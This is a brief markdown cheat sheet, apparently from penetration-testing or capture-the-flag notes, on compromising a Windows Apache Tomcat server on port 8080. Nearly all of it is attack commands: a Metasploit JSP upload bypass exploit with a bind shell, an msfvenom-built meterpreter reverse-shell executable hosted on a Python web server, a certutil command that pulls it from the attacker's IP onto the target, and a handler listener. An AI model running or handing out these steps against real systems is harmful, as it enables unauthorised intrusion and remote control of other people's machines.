# Apache Tomcat 8080 Windows system
  - __`search type:exploit tomcat`__
For windows
```
use exploit/multi/http/tomcat_jsp_upload_bypass
info 
set payload java/jsp_shell_bind_tcp
set SHELL cmd
exploit
```

- __`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -f exe > meterpreter.exe`__
- __`sudo python -m SimpleHTTPServer`__

__After hosting the file login in to the target system and download the payload__
  - __`certutil -urlcache -f http://<youip>/meterpreter.exe meterpreter.exe`__

__After downloading the payload in target system you need to set the listern__

- `nano get.rc`
__In that file__
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <youip>
set LPORT <4444>
```
__And execute the meterpreter.exe in the target system__
  - `.\meterpreter.exe`
